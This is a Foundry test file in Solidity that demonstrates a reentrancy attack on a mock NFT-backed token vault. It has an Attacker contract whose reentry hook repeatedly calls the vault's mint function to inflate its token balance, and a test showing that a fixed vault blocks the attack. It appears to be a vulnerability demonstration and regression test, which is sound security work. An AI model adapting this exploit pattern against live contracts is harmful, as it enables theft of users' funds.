// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {MockNFT, VulnerableBROVault} from "../src/VulnerableBROVault.sol";
import {FixedBROVault} from "../src/FixedBROVault.sol";

contract Attacker {
    MockNFT nft;
    VulnerableBROVault vault;
    uint256 loops;

    constructor(address _nft, address _vault) {
        nft = MockNFT(_nft);
        vault = VulnerableBROVault(_vault);
    }

    function attack(uint256 id) external {
        nft.approve(address(vault), id);
        vault.mint(id);
    }

    function reentryHook() external {
        if (loops++ < 5) {
            uint256 id = nft.mint(address(this));
            nft.approve(address(vault), id);
            vault.mint(id);
        }
    }
}

contract FixedAttacker {
    MockNFT nft;
    FixedBROVault vault;

    constructor(address _nft, address _vault) {
        nft = MockNFT(_nft);
        vault = FixedBROVault(_vault);
    }

    function attack(uint256 id) external {
        nft.approve(address(vault), id);
        vault.mint(id);
    }
}

contract BROVaultTest is Test {
    MockNFT nft;
    VulnerableBROVault vuln;
    FixedBROVault fixed_;

    function setUp() public {
        nft = new MockNFT();
        vuln = new VulnerableBROVault(address(nft));
        fixed_ = new FixedBROVault(address(nft));
    }

    function test_VulnDoubleMint() public {
        Attacker atk = new Attacker(address(nft), address(vuln));
        uint256 id = nft.mint(address(atk));
        atk.attack(id);
        uint256 bal = vuln.broBalance(address(atk));
        emit log_named_uint("Attacker BRO", bal);
        emit log_named_uint("Legitimate  ", vuln.RATE());
        emit log_named_uint("Inflation x ", bal / vuln.RATE());
        assertGt(bal, vuln.RATE(), "Expected reentrancy inflation");
    }

    function test_FixedBlocksReentry() public {
        FixedAttacker atk = new FixedAttacker(address(nft), address(fixed_));
        uint256 id = nft.mint(address(atk));
        atk.attack(id);
        assertEq(fixed_.broBalance(address(atk)), fixed_.RATE());
        emit log_named_uint("Fixed vault ", fixed_.broBalance(address(atk)));
    }
}
